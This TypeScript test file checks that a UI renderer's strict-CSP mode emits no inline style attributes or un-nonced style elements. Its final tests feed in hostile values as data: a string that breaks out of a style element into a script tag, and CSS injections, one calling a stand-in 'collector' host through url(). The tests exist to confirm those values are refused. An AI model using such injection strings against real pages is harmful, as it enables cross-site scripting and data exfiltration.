// ============================================================================
//  The strict-CSP render mode (Phase 1545), asserted in EMITTED BYTES.
//
//  The claim is a claim about a document: served under
//  `style-src 'self' 'nonce-…'` with no `'unsafe-inline'`, nothing this renderer
//  emitted is blocked. Two things have to be true of the bytes — no `style`
//  ATTRIBUTE anywhere, and no `<style>` ELEMENT without the render's nonce — so
//  the assertions are over the HTML string rather than over the context.
//
//  Both are ABSENCE assertions, and an absence assertion is worth exactly what
//  its detector is worth: one that cannot match anything passes on every input,
//  forever, and reads as proof. The go-red twin below reintroduces ONE
//  style-bearing site and requires each detector to see it.
//
//  The CROSS-HOST pins are the other half. A document is supposed to render the
//  same on every conformant host, and a generated class name is part of the
//  document — so the values pinned here are the same strings the F# reference
//  renderer's own suite pins for the same trees. If either host's declaration
//  spelling or hash drifted, exactly one of the two suites would go red, naming
//  the class it now produces.
// ============================================================================

import { describe, expect, it } from 'vitest';

import { fuaran } from '@fuaran-ui/ui';
import type { BoxLayout, BoxSpec, Node } from '@fuaran-ui/schema';

import { renderToHtml, strictCsp, permissiveCsp } from '../src/index.js';
import { declarations, declarationText, generatedClass, isCollectableValue } from '../src/csp.js';

const NONCE = 'r4nd0m-per-response';

/** Every `style="…"` attribute, anchored on the preceding whitespace so it cannot
 * match a substring of another attribute name (`data-my-style="…"`). */
const styleAttributes = (html: string): string[] => html.match(/(?<=\s)style="[^"]*"/g) ?? [];

/** Every `<style …>` OPEN TAG that does not carry a nonce. Matching the open tag
 * only means a `</style>` close and the CSS between them are never mistaken for
 * an element, and the nonce test is over that tag's own attribute region. */
const unNoncedStyleElements = (html: string): string[] =>
  (html.match(/<style\b[^>]*>/g) ?? []).filter((tag) => !tag.includes('nonce='));

// ─── The style-bearing corpus ────────────────────────────────────────────────
//
//  One tree per site in this renderer that can emit a `style` attribute. Written
//  out rather than derived: the point is to NAME the sites, and a site added
//  later without a `cspStyle` call is invisible to a derived corpus.

const leaf = (id: string): Node<unknown> => fuaran.markdown<unknown>(id, 'x');

/**
 * A `Box` carrying an arbitrary `BoxLayout`. The smart constructors do not
 * expose every layout payload this renderer emits CSS for (`gridLayout` takes no
 * gap, `stack` takes no gap), so the layout is substituted onto a constructed
 * node rather than hand-writing a whole `Node` literal — which would fix the
 * defaults this test has no opinion about.
 */
const boxWith = (id: string, layout: BoxLayout, children: Node<unknown>[]): Node<unknown> => {
  const base = fuaran.stack<unknown>({ id, children });
  const spec = (base.kind as { layout: { spec: BoxSpec<unknown> } }).layout.spec;
  return { ...base, kind: { kind: 'Layout', layout: { kind: 'Box', spec: { ...spec, layout } } } };
};

const grid = boxWith('g1', { kind: 'Grid', cols: 3, templateColumns: '1fr 2fr 1fr', gap: 12 }, [
  leaf('a'),
]);

const masonry = boxWith('m1', { kind: 'Masonry', cols: 3, gap: 8 }, [leaf('c')]);

const flex = boxWith('f1', { kind: 'Flex', direction: 'Horizontal', wrap: false, gap: 16 }, [
  leaf('d'),
]);

const split = fuaran.splitPanel<unknown>({
  id: 'sp',
  weight: 0.5,
  children: [leaf('e'), leaf('f')],
});

const scroll = fuaran.scrollArea<unknown>({
  id: 'sc1',
  children: [leaf('g')],
  maxHeight: 200,
  maxWidth: 320,
});

const progress = fuaran.progress<unknown>({ id: 'p1', fraction: 0.42 });

const styleBearingCorpus: ReadonlyArray<readonly [string, Node<unknown>]> = [
  ['Box/Grid (track list + gap)', grid],
  ['Box/Masonry (column count + gap)', masonry],
  ['Box/Flex (gap)', flex],
  ['SplitPanel (two pane weights)', split],
  ['ScrollArea (both ceilings)', scroll],
  ['Progress (fill width)', progress],
];

const wholeCorpus = fuaran.dashboard<unknown>({
  id: 'root',
  children: styleBearingCorpus.map(([, n]) => n),
});

describe('strict-CSP render mode', () => {
  // ── 1. The default does not move ───────────────────────────────────────────

  it('is byte-identical to the unmoded entry point under the permissive posture', () => {
    for (const [name, node] of styleBearingCorpus) {
      expect(renderToHtml(node, { csp: permissiveCsp }), name).toBe(renderToHtml(node));
    }
  });

  it('still emits the style attribute it always did under permissive', () => {
    // If this fails the corpus has stopped naming style-bearing sites, and every
    // strict assertion below is vacuous.
    for (const [name, node] of styleBearingCorpus) {
      expect(styleAttributes(renderToHtml(node)).length, name).toBeGreaterThan(0);
    }
  });

  // ── 2. The claim ───────────────────────────────────────────────────────────

  it('emits no style attribute under strict mode, per site', () => {
    for (const [name, node] of styleBearingCorpus) {
      expect(styleAttributes(renderToHtml(node, { csp: strictCsp(NONCE) })), name).toEqual([]);
    }
  });

  it('emits no style attribute and no un-nonced style element over the whole corpus', () => {
    const html = renderToHtml(wholeCorpus, { csp: strictCsp(NONCE) });
    expect(styleAttributes(html)).toEqual([]);
    expect(unNoncedStyleElements(html)).toEqual([]);
    expect(html).toContain(`nonce="${NONCE}"`);
    // The stylesheet LEADS the body: a rule that arrives after the element it
    // styles is a flash of unstyled content on a slow connection.
    expect(html.startsWith('<style ')).toBe(true);
  });

  it('emits no style element at all for a tree with no continuous value', () => {
    const plain = fuaran.dashboard<unknown>({ id: 'plain', children: [leaf('a')] });

    const html = renderToHtml(plain, { csp: strictCsp(NONCE) });
    expect(html).not.toContain('<style');
    expect(html).toBe(renderToHtml(plain));
  });

  // ── 3. The go-red twin ─────────────────────────────────────────────────────

  it('the detectors go red when one site is reintroduced', () => {
    const strictHtml = renderToHtml(wholeCorpus, { csp: strictCsp(NONCE) });

    // A real strict document with ONE node rendered through the permissive path
    // spliced in — exactly what a site that forgot to route through `cspStyle`
    // would produce.
    const leaked = strictHtml + renderToHtml(grid);
    expect(styleAttributes(leaked).length).toBeGreaterThan(0);

    const unNonced = strictHtml + '<style>.x{color:red}</style>';
    expect(unNoncedStyleElements(unNonced).length).toBeGreaterThan(0);

    // …and the same detectors say nothing about the clean document, or the two
    // assertions above would pass on any input at all.
    expect(styleAttributes(strictHtml)).toEqual([]);
    expect(unNoncedStyleElements(strictHtml)).toEqual([]);
  });

  // ── 4. Determinism + deduplication ─────────────────────────────────────────

  it('renders two strict passes of one tree byte-identically', () => {
    expect(renderToHtml(wholeCorpus, { csp: strictCsp(NONCE) })).toBe(
      renderToHtml(wholeCorpus, { csp: strictCsp(NONCE) }),
    );
  });

  it('writes a generated rule once however many elements carry it', () => {
    const gapFlex = { kind: 'Flex', direction: 'Vertical', wrap: false, gap: 4 } as const;
    const duplicated = fuaran.dashboard<unknown>({
      id: 'root',
      children: [boxWith('same', gapFlex, [leaf('a')]), boxWith('same', gapFlex, [leaf('b')])],
    });

    const html = renderToHtml(duplicated, { csp: strictCsp(NONCE) });
    const cls = generatedClass('same', 'flex', declarations.flex(4));

    expect(html.split(`.${cls}{`).length - 1).toBe(1);
    // The rule, plus both elements that carry it.
    expect(html.split(cls).length - 1).toBe(3);
  });

  // ── 5. The cross-host pins ─────────────────────────────────────────────────
  //
  //  These exact strings are pinned by the F# reference renderer's own suite for
  //  the same trees. They are written out rather than computed so that a drift in
  //  either host's declaration spelling or hash reddens ONE suite and names the
  //  class it now produces — a computed expectation on both sides would move
  //  together and prove nothing.

  it('derives the same class names the reference host derives', () => {
    const cases: ReadonlyArray<readonly [Node<unknown>, string, string]> = [
      [grid, 'fuaran-csp-c5f9115c', declarationText(declarations.grid('1fr 2fr 1fr', 12))],
      [masonry, 'fuaran-csp-6d6f75ea', declarationText(declarations.masonry(3, 8))],
      [flex, 'fuaran-csp-06499874', declarationText(declarations.flex(16))],
      [split, 'fuaran-csp-48acacb7', declarationText(declarations.splitPane(0.5))],
      [scroll, 'fuaran-csp-5082b942', declarationText(declarations.scrollArea(200, 320))],
      [progress, 'fuaran-csp-4140a29a', declarationText(declarations.progressFill(0.42))],
    ];

    for (const [node, expected, rule] of cases) {
      const html = renderToHtml(node, { csp: strictCsp(NONCE) });
      expect(html, expected).toContain(expected);
      expect(html, expected).toContain(`.${expected}{${rule}}`);
    }
  });

  it('gives the split panel two classes even at equal weights', () => {
    // One node id, identical declarations: only the slot discriminator keeps
    // them apart, and this is the case that proves it does.
    const left = generatedClass('sp', 'split-left', declarations.splitPane(0.5));
    const right = generatedClass('sp', 'split-right', declarations.splitPane(0.5));
    expect(left).not.toBe(right);

    const html = renderToHtml(split, { csp: strictCsp(NONCE) });
    expect(html).toContain(left);
    expect(html).toContain(right);
  });

  // ── 6. The new raw-CSS sink refuses what it must ───────────────────────────

  it('refuses a collected value that could close the style element', () => {
    // The shared emission grammar denies `; { } \` — it does NOT deny `<`, which
    // is correct for an attribute value and wrong for raw `<style>` content,
    // where the HTML parser looks for `</style` before any CSS parser reads it.
    expect(isCollectableValue('1fr</style><script>alert(1)</script>')).toBe(false);
    expect(isCollectableValue('red;background:url(x)')).toBe(false);
    expect(isCollectableValue('red}')).toBe(false);
    expect(isCollectableValue('repeat(3, 1fr)')).toBe(true);
    expect(isCollectableValue('clamp(1rem, 2vw, 3rem)')).toBe(true);
  });

  it('lets a hostile track list reach neither the attribute nor the stylesheet', () => {
    const hostile = boxWith(
      'hostile',
      { kind: 'Grid', cols: 2, templateColumns: '1fr;background:url(https://collector/?d=1)' },
      [leaf('a')],
    );

    const html = renderToHtml(hostile, { csp: strictCsp(NONCE) });
    expect(html).not.toContain('collector');
    // And the refusal is still marked on the element, exactly as under permissive.
    expect(html).toContain('data-fuaran-css-refused');
  });
});
